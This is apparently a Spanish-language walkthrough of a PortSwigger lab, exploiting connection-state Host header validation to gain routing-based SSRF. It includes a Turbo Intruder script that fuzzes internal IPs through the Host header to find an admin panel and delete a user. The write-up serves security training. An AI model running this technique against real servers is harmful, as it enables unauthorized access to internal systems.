---
title: Host validation bypass via connection state attack
description: Laboratorio de Portswigger sobre HTTP Host Header Attacks
date: 2026-04-04 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - HTTP Host Header Attacks
tags:
  - Portswigger Labs
  - HTTP Host Header Attacks
  - Host validation bypass via connection state attack
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` es `vulnerable` a `Routing-based SSRF` a `través` de la `cabecera Host`. Aunque el `servidor front-end` puede parecer que `valida correctamente esta cabecera al principio`, en realidad `asume` que `todas las solicitudes dentro de la misma conexión son iguales a la primera que recibe`. Podemos `aprovechar` este `fallo` para `acceder` a `un panel de administración interno inseguro ubicado en una dirección IP interna`. Para `resolver` el `laboratorio`, tenemos que `acceder` al `panel de administración interno ubicado en el rango 192.168.0.0/24` y luego `eliminar` al `usuario carlos`

---

## Resolución

Al `acceder` a la `web` vemos `esto`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_1.png)

He `capturado` la `petición` a la `raíz` de la `web` y he `lanzado` la `herramienta HTTP Request Smuggler` [https://github.com/PortSwigger/http-request-smuggler.git](https://github.com/PortSwigger/http-request-smuggler.git) porque he visto que la `web` usa `HTTP 1.1`. `He ido lanzando ataque por ataque y cuando he lanzado Connection-state me ha reportado algo interesante`, esto lo podemos ver `accediendo` a `Target > Site map > Issues`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_2.png)

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_3.png)

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_4.png)

`Enviamos` la `Request 1` y la `Request 2` al `Repeater` para `testear` su `comportamiento`. Esta es la `primera petición`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_5.png)

Esta es la `segunda petición`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_6.png)

Ahora vamos a `crear` un `grupo` con estas `dos peticiones` y `las vamos a enviar mediante una misma conexión`. `La primera petición nos devuelve la misma respuesta que si la enviásemos de forma individual`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_7.png)

Sin embargo, `la segunda respuesta cambia al enviarse en una misma conexión`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_8.png)

`El error de la segunda petición se produce porque el dominio no existe`. Para `verificar` que `esta` es la `causa`, he `usado` un `dominio` de `Burpsuite Collaborator`. Lo que al parecer ha pasado aquí es que `el servidor analiza la cabecera Host`, `comprueba` si su `valor` es un `dominio confiable` o `whitelisteado` y `si no es así, hace un redirect al dominio principal`. Sin embargo, `el servidor asume que solo se va a enviar una petición por conexión, y por lo tanto, solo está verificando que el valor de la cabecera Host que emite la primera petición pertenece al dominio whitelisteado`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_9.png)

Una vez hemos conseguido `bypassear` esto, `usamos` la extensión `Host Header Inchecktion` [https://github.com/portswigger/host-header-inchecktion](https://github.com/portswigger/host-header-inchecktion) para `enumerar vulnerabilidades de la cabecera Host`. Para hacerlo debemos pulsar `click derecho > Host Header Inchecktion > Collaborator payload`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_10.png)

Una vez haya `terminado`, si nos `vamos` a `Target > Site map > Issues` veremos que nos ha `detectado` un posible `SSRF`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_11.png)

Una vez hemos `confirmado` que existe un `SSRF`, vamos a `enumerar direcciones IP internas`. Para hacer esto, `necesitamos generarlas primero`, y para ello vamos a `usar` la herramienta `ipRangeGenerator` [https://github.com/Justice-Reaper/ipRangeGenerator.git](https://github.com/Justice-Reaper/ipRangeGenerator.git). El `enunciado` nos dice que el `CIDR` es `192.168.0.0/24` 

```
python ipRangeGenerator.py -cidr "192.168.0.0/24" -o ips.txt
[+] Generating IPs for network 192.168.0.0/24
[+] Output file: ips.txt
[+] Generating IPs: Completed! 254 IPs generated in ips.txt
[+] Progress: 100%
```

Una vez tengamos esto, `instalamos` la extensión `Turbo Intruder` [https://github.com/PortSwigger/turbo-intruder.git](https://github.com/PortSwigger/turbo-intruder.git). Lo siguiente que debemos hacer es `pulsar` en `Turbo Intruder > run script`, `pegar` este `script` y `cambiar` el `Host`. `Lo que estamos haciendo es lo mismo que hacemos desde el Repeater pero fuzzeando los valores de la cabecera Host en la segunda petición`. Una vez hayamos hecho todo esto `pulsamos` en `Attack`

```
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=2,
        pipeline=False
    )

    for word in open('/home/justice-reaper/Downloads/ipRangeGenerator/ips.txt'):
        word = word.strip()

        engine.queue(
            'GET / HTTP/1.1\r\n'
            'Host: 0aed003f0440fb49815861e300930082.h1-web-security-academy.net\r\n'
            'Cookie: session=iV9RfUkVKONmMTIaZ4Ui6L1dncJoqHEP; _lab=46%7cMCwCFH2mROuaojBbhabYAVXvrKIlZFFcAhQ9SFHQky6dOm0%2bz35hKxRkIvZh8qxAz1FVjJQf07BszODp1xpaQDHK5C%2fewE%2fBTAeT7lVle1FoXk105D%2busq1%2bo8dLKkWX%2bw1bp3VB11OFCYLEZOI%2bbpjVHIDeXR3ek8al2BlQ%2bMJcDvCnhDs%3d\r\n'
            'Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"\r\n'
            'Sec-Ch-Ua-Mobile: ?0\r\n'
            'Sec-Ch-Ua-Platform: "Linux"\r\n'
            'Upgrade-Insecure-Requests: 1\r\n'
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\r\n'
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n'
            'Sec-Fetch-Site: none\r\n'
            'Sec-Fetch-Mode: navigate\r\n'
            'Sec-Fetch-User: ?1\r\n'
            'Sec-Fetch-Dest: document\r\n'
            'Accept-Encoding: gzip, deflate, br\r\n'
            'Accept-Language: es-ES,es;q=0.9\r\n'
            'Priority: u=0, i\r\n'
            'Connection: keep-alive\r\n\r\n'
        )

        engine.queue(
            'GET / HTTP/1.1\r\n'
            'Host: ' + word + '\r\n'
            'Cookie: session=iV9RfUkVKONmMTIaZ4Ui6L1dncJoqHEP; _lab=46%7cMCwCFH2mROuaojBbhabYAVXvrKIlZFFcAhQ9SFHQky6dOm0%2bz35hKxRkIvZh8qxAz1FVjJQf07BszODp1xpaQDHK5C%2fewE%2fBTAeT7lVle1FoXk105D%2busq1%2bo8dLKkWX%2bw1bp3VB11OFCYLEZOI%2bbpjVHIDeXR3ek8al2BlQ%2bMJcDvCnhDs%3d\r\n'
            'Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"\r\n'
            'Sec-Ch-Ua-Mobile: ?0\r\n'
            'Sec-Ch-Ua-Platform: "Linux"\r\n'
            'Upgrade-Insecure-Requests: 1\r\n'
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\r\n'
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n'
            'Sec-Fetch-Site: none\r\n'
            'Sec-Fetch-Mode: navigate\r\n'
            'Sec-Fetch-User: ?1\r\n'
            'Sec-Fetch-Dest: document\r\n'
            'Accept-Encoding: gzip, deflate, br\r\n'
            'Accept-Language: es-ES,es;q=0.9\r\n'
            'Priority: u=0, i\r\n'
            'Connection: keep-alive\r\n\r\n'
        )

def handleResponse(req, interesting):
    table.add(req)
```

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_12.png)

`Si filtramos por la columna status podemos ver que si la IP existe nos hace un redirect a /admin`. En este caso la `IP` es `192.168.0.1`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_13.png)

Una vez sabemos esto, `vamos` al `Repeater` y en la `segunda petición`, `cambiamos` el `valor de la cabecera Host` por `192.168.0.1` y `realizamos` la `petición` a `/admin`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_14.png)

Para `ver` la `respuesta` en el `navegador`, hacemos `click derecho > Open response in browser`. `Ponemos como usuario carlos, pulsamos sobre el botón Delete user, capturamos la petición con Burpsuite, la metemos como segunda petición del grupo que tenemos creado en el Repeater y cambiamos el valor de la cabecera Host por 192.168.0.1`. Cuando `enviemos` la `petición` ya habremos `borrado` al `usuario carlos`

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_15.png)

![](/assets/img/HTTP-Host-Header-Attacks-Lab-6/image_16.png)
